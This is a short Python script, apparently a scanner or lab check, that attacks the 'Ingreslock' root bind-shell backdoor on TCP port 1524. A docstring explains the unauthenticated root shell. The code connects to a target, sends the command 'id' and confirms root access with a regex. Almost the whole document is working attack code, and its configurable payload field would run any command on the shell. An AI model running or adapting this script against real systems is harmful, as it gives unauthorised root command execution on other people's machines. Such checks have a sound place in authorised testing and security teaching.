import socket
import re
import time

"""
ATTACK NAME: Ingreslock Bind Shell (Root Backdoor)
PORT: 1524
VULNERABILITY: This is a 'Bind Shell' misconfiguration. Unlike a standard 
vulnerability that requires a complex memory exploit, this is an 
administrative backdoor intentionally or accidentally left open. 

HOW IT WORKS: 
1. The service (ingreslock) is piping /bin/sh directly to a TCP socket.
2. Upon connection, the server provides a root prompt immediately.
3. No authentication is required.

SECURITY IMPACT: Critical. Full system compromise (Root access).
"""


def validate_evidence(validation_rule, result):
    if result is None: return False
    rule_type = validation_rule.get("type")
    try:
        if rule_type == "regex":
            pattern = validation_rule.get("pattern")
            return re.search(pattern, str(result), re.IGNORECASE) is not None
    except Exception as e:
        print(f"[!] Validation Logic Error: {e}")
        return False
    return False

TARGET_IP = "victim" 
TEMPLATE = {
    "params": {"port": 1524, "payload": "id\n", "timeout": 5},
    "validation": {"type": "regex", "pattern": r"uid=0\(root\)"}
}

def run_test():
    print(f"[*] Attacking {TARGET_IP} on Port 1524...")
    raw_response = ""
    
    try:
        with socket.create_connection((TARGET_IP, TEMPLATE["params"]["port"]), timeout=TEMPLATE["params"]["timeout"]) as s:
            # Send the command
            s.sendall(TEMPLATE["params"]["payload"].encode())
            
            # CRITICAL FIX: Give the shell a moment to execute the command
            time.sleep(1) 
            
            # Read multiple times to ensure we catch the output after the prompt
            s.setblocking(False) # Don't hang if no more data
            try:
                while True:
                    chunk = s.recv(4096).decode(errors='ignore')
                    if not chunk: break
                    raw_response += chunk
            except BlockingIOError:
                pass # No more data to read for now

            print(f"[+] Combined Response Received:\n{raw_response.strip()}")
            
    except Exception as e:
        print(f"[!] Execution Failed: {e}")
        return

    print("[*] Running Validator...")
    is_success = validate_evidence(TEMPLATE["validation"], raw_response)
    
    if is_success:
        print("✅ VERDICT: VULNERABILITY CONFIRMED. 'uid=0(root)' found.")
    else:
        print("❌ VERDICT: EXPLOIT FAILED. Data received but no root match.")

if __name__ == "__main__":
    run_test()